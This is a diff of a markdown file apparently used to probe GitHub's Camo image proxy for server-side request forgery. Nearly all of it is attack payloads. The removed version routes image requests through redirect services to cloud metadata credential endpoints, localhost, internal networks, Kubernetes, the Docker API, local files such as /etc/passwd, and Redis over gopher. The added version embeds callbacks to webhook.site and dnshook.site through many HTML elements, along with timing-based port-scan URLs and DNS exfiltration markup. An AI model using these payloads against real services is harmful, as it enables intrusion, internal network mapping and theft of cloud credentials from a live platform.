@@ -1,94 +1,115 @@
-# SSRF Test v21 - Redirect Chain SSRF Deep Dive
+# Security Research - v22
 
-Testing if Camo's redirect following bypasses internal IP checks.
+## Alternative HTML Element Testing
+
+Testing if GitHub processes non-img tags differently.
+
+### Picture Element with Srcset
+<picture>
+  <source srcset="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/picture-source.gif" media="(min-width: 800px)">
+  <img src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/picture-img.gif" alt="v22-picture">
+</picture>
+
+### Video Poster
+<video poster="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/video-poster.gif" width="1" height="1">
+  <source src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/video-source.gif" type="video/mp4">
+</video>
+
+### Audio with Image
+<audio controls poster="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/audio-poster.gif"></audio>
+
+### Object Tag
+<object data="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/object-data.gif" type="image/gif" width="1" height="1"></object>
+
+### Embed Tag
+<embed src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/embed-src.gif" type="image/gif" width="1" height="1">
+
+### Background Styles (CSS)
+<div style="background-image: url('https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/bg-style.gif'); width:1px; height:1px;"></div>
+
+<span style="background: url(https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/span-bg.gif)">x</span>
+
+### Input Image Type
+<input type="image" src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/input-image.gif" width="1" height="1">
+
+### Button with Background
+<button style="background-image: url('https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/button-bg.gif');">.</button>
+
+### Link Preload (may not render)
+<link rel="preload" href="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/link-preload.gif" as="image">
+
+### SVG Image
+<svg width="1" height="1">
+  <image href="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/svg-image.gif" width="1" height="1"/>
+</svg>
+
+### SVG Use External
+<svg width="1" height="1">
+  <use href="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/svg-use.svg#test"></use>
+</svg>
+
+---
+
+## Standard Markdown Images (Control)
+
+### Basic Markdown
+![v22-md-basic](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/md-basic.gif)
+
+### HTML IMG
+<img src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/html-img.gif" alt="v22-html">
+
+---
+
+## Timing-Based SSRF Endpoints
+
+Testing slow endpoints vs fast endpoints:
+
+### Slow Response (httpbin delay)
+![slow-5s](https://httpbin.org/delay/5)
+
+### Redirect Chain with Delay
+![redirect-delay](https://httpbin.org/redirect-to?url=https://httpbin.org/delay/3?callback=https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/timing-redirect.gif)
+
+### Streaming Response
+![stream](https://httpbin.org/stream-bytes/1024)
+
+---
+
+## Port Scan via Timing
+
+Different ports may have different timeout behaviors:
+
+![port-22](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34:22/port-22.gif)
+![port-443](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34:443/port-443.gif)
+![port-8080](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34:8080/port-8080.gif)
+![port-3306](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34:3306/port-3306.gif)
+
+---
+
+## DNS Exfil via HTML Attributes
+
+<img src="https://v22-html-test.7b02b6cc-0725-4212-96f5-82129a2e0e34.dnshook.site/dns.gif" onerror="this.src='https://v22-onerror.7b02b6cc-0725-4212-96f5-82129a2e0e34.dnshook.site/onerror.gif'">
+
+<img srcset="https://v22-srcset.7b02b6cc-0725-4212-96f5-82129a2e0e34.dnshook.site/srcset.gif 1x, https://v22-srcset-2x.7b02b6cc-0725-4212-96f5-82129a2e0e34.dnshook.site/srcset2x.gif 2x" src="https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/srcset-fallback.gif">
+
+---
+
+## GitHub-Specific Features
+
+### Issue/PR References with Images
+See #1 for details.
+
+### Emoji Proxy Test
+:octocat: ![emoji-test](https://github.githubassets.com/images/icons/emoji/octocat.png)
+
+### GitHub User Avatar
+![avatar](https://avatars.githubusercontent.com/u/1?v=4)
+
+---
 
 ## Canary
-![](https://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/v21-canary.gif)
+![v22-canary](https://webhook.site/7b02b6cc-0725-4212-96f5-82129a2e0e34/v22-canary.gif)
 
-## 1. httpbin.org Redirect to Internal IPs
+---
 
-### AWS Metadata via redirect
-![meta1](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
-![meta2](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/user-data)
-![meta3](http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-
-### Localhost via redirect
-![local1](http://httpbin.org/redirect-to?url=http://127.0.0.1/)
-![local2](http://httpbin.org/redirect-to?url=http://localhost/)
-![local3](http://httpbin.org/redirect-to?url=http://0.0.0.0/)
-
-### Internal networks via redirect
-![int1](http://httpbin.org/redirect-to?url=http://10.0.0.1/)
-![int2](http://httpbin.org/redirect-to?url=http://192.168.1.1/)
-![int3](http://httpbin.org/redirect-to?url=http://172.16.0.1/)
-
-## 2. Multiple Redirect Hops
-
-### Triple redirect
-![hop1](http://httpbin.org/redirect/3?url=http://169.254.169.254/latest/meta-data/)
-
-### Absolute redirect
-![abs1](http://httpbin.org/absolute-redirect/1?url=http://169.254.169.254/)
-
-### Relative redirect  
-![rel1](http://httpbin.org/relative-redirect/1?url=http://127.0.0.1/)
-
-## 3. DNS Exfiltration After Redirect
-
-### If redirect works, trigger DNS callback
-![dns1](http://httpbin.org/redirect-to?url=http://redirect-success.0e5ce386-8634-418a-8abd-f9cd8768638f.dnshook.site/test.gif)
-![dns2](http://httpbin.org/redirect-to?url=http://0e5ce386-8634-418a-8abd-f9cd8768638f.dnshook.site/after-redir.gif)
-
-## 4. Protocol Downgrade via Redirect
-
-### HTTPS to HTTP redirect
-![proto1](https://httpbin.org/redirect-to?url=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/https-to-http.gif)
-![proto2](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
-
-## 5. Alternative Redirect Services
-
-### request.basno.com (another redirect service)
-![basno1](http://request.basno.com/anything/redirect?url=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/basno.gif)
-
-### mockbin.io
-![mock1](http://mockbin.io/redirect/302?to=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/mockbin.gif)
-
-## 6. File Protocol via Redirect
-
-![file1](http://httpbin.org/redirect-to?url=file:///etc/passwd)
-![file2](http://httpbin.org/redirect-to?url=file:///proc/self/environ)
-
-## 7. Gopher Protocol via Redirect
-
-![gopher1](http://httpbin.org/redirect-to?url=gopher://localhost:25/)
-![gopher2](http://httpbin.org/redirect-to?url=gopher://localhost:6379/_INFO)
-
-## 8. Cloud Metadata via Redirect
-
-### GCP
-![gcp1](http://httpbin.org/redirect-to?url=http://metadata.google.internal/computeMetadata/v1/)
-![gcp2](http://httpbin.org/redirect-to?url=http://169.254.169.254/computeMetadata/v1/)
-
-### Azure
-![az1](http://httpbin.org/redirect-to?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01)
-![az2](http://httpbin.org/redirect-to?url=http://168.63.129.16/machine)
-
-### DigitalOcean
-![do1](http://httpbin.org/redirect-to?url=http://169.254.169.254/metadata/v1.json)
-
-## 9. Kubernetes via Redirect
-
-![k8s1](http://httpbin.org/redirect-to?url=http://kubernetes.default.svc/)
-![k8s2](http://httpbin.org/redirect-to?url=http://10.0.0.1:443/api/v1/)
-
-## 10. Docker via Redirect
-
-![dock1](http://httpbin.org/redirect-to?url=http://172.17.0.1:2375/version)
-![dock2](http://httpbin.org/redirect-to?url=http://host.docker.internal/)
-
-## 11. Verification - Confirm Redirect Works
-
-![verify1](http://httpbin.org/redirect-to?url=http://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/redirect-verify.gif)
-![verify2](https://webhook.site/0e5ce386-8634-418a-8abd-f9cd8768638f/direct-verify.gif)
-
-Version 21 - Redirect Chain SSRF Attack
+*v22 - Alternative HTML elements and timing tests*
